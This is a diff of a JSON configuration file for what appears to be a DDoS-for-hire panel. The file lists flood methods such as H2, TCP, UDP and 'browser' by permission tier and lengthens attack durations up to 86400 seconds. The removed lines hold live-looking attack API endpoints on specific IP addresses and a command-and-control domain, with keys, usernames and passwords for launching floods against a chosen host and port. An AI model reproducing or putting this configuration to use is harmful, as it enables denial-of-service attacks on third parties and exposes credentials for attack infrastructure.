@@ -1,7 +1,7 @@
 [
     {
       "name": "tls",
-      "time": 300,
+      "time": 1200,
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
       "api": [
@@ -13,7 +13,7 @@
     },
     {
       "name": "mix",
-      "time": 300,
+      "time": 1200,
       "group": "test",
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
@@ -26,7 +26,7 @@
     },
     {
       "name": "https",
-      "time": 300,
+      "time": 1200,
       "group": "test",
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
@@ -39,7 +39,7 @@
     },
     {
       "name": "hybrid",
-      "time": 300,
+      "time": 1200,
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
       "api": [
@@ -51,7 +51,7 @@
     },
     {
       "name": "mixbill",
-      "time": 300,
+      "time": 1200,
       "group": "test",
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
@@ -64,110 +64,85 @@
     },
     {
       "name": "vflood",
-      "time": 300,
+      "time": 1200,
       "group": "test",
       "description": "Layer 7 - Attack URL [BASIC]",
       "permission": [],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VFLOOD&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=VFLOOD&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2FLOOD&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=VFLOOD&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VFLOOD&key="
       ]
     },
     {
       "name": "vern-b",
-      "time": 300,
+      "time": 1200,
       "description": "Layer 7 - Attack URL [VIP]",
       "permission": ["vip"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VERN-B&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=VERN-B&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2NEYLI&key=tin123",
-        "http://cnc.anomalystress.cloud:555/attack?username=tin&password=tinganteng&method=h2-kill&host=<<$host>>&port=<<$port>>&time=<<$time>>",
-        "http://139.59.91.16:2906/api/attack?method=VERN-B&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=VERN-B&key="
       ]
     },
     {
       "name": "browser",
-      "time": 300,
+      "time": 1200,
       "description": "Layer 7 - Attack URL [VIP]",
       "permission": ["vip"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BROWSER&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=BROWSER&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://cnc.anomalystress.cloud:555/attack?username=tin&password=tinganteng&method=browser&host=<<$host>>&port=<<$port>>&time=<<$time>>",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BROWSER&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=BROWSER&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BROWSER&key="
       ]
     },
     {
       "name": "h2",
-      "time": 300,
+      "time": 1200,
       "group": "test",
       "description": "Layer 7 - Attack URL [VIP]",
       "permission": ["vip"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=H2&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2FLASH&key=tin123",
-        "http://cnc.anomalystress.cloud:555/attack?username=tin&password=tinganteng&method=h2-fly&host=<<$host>>&port=<<$port>>&time=<<$time>>",
-        "http://139.59.91.16:2906/api/attack?method=H2&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2&key="
       ]
     },
     {
       "name": "h2-vern",
-      "time": 300,
+      "time": 1200,
       "group": "test",
       "description": "Layer 7 - Attack URL [VIP]",
       "permission": ["vip"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2-VERN&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=H2-VERN&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2MIA&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=H2-VERN&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2-VERN&key="
       ]
     },
     {
       "name": "h2-jouma",
-      "time": 300,
+      "time": 1200,
       "group": "test",
       "description": "Layer 7 - Attack URL [VIP]",
       "permission": ["vip"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2-JOUMA&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=H2-JOUMA&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2BYPASS&key=tin123",
-        "http://cnc.anomalystress.cloud:555/attack?username=tin&password=tinganteng&method=h2-bypass&host=<<$host>>&port=<<$port>>&time=<<$time>>",
-        "http://139.59.91.16:2906/api/attack?method=H2-JOUMA&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2-JOUMA&key="
       ]
     },
     {
       "name": "h2-fury",
-      "time": 300,
+      "time": 1200,
       "group": "test",
       "description": "Layer 7 - Attack URL [VIP]",
       "permission": ["vip"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2-FURY&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=H2-FURY&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2MERIS&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=H2-FURY&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=H2-FURY&key="
       ]
     },
     {
       "name": "hold",
-      "time": 2000,
+      "time": 86400,
       "group": "test",
-      "description": "Layer 7 - Attack URL [VIP]",
+      "description": "Layer 7 - Attack URL [SVIP]",
       "permission": ["admin"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOLD&key=vernitigercnchswkasads"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HOLD&key="
       ]
     },
     {
       "name": "tcp",
-      "time": 100,
+      "time": 120,
       "group": "test",
       "concurrents": 2,
       "cooldown": 400,
@@ -175,15 +150,12 @@
       "description": "Layer 4 - Attack IP [VIP]",
       "permission": ["vip"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP&key=vernitigercnchswkasads",
-        "http://143.198.15.67:2906/api/attack?method=TCP&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP&key=tin123",
-        "http://139.59.91.16:2906/api/attack?method=TCP&host=<<$host>>&port=<<$port>>&time=<<$time>>&username=verni&apikey=tiger"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TCP&key="
       ]
     },
     {
       "name": "udp",
-      "time": 100,
+      "time": 120,
       "group": "test",
       "concurrents": 2,
       "cooldown": 400,
@@ -191,9 +163,7 @@
       "description": "Layer 4 - Attack IP [VIP]",
       "permission": ["vip"],
       "api": [
-        "http://47.237.30.77:2906/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP&key=vernitigercnchswkasads",
-        "http://cnc.anomalystress.cloud:555/attack?username=tin&password=tinganteng&method=botnet-udp&host=<<$host>>&port=<<$port>>&time=<<$time>>",
-        "http://159.65.10.23:2006/api/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP&key=tin123"
+        "http://url/start/attack?host=<<$host>>&port=<<$port>>&time=<<$time>>&method=UDP&key="
       ]
     }
 ]
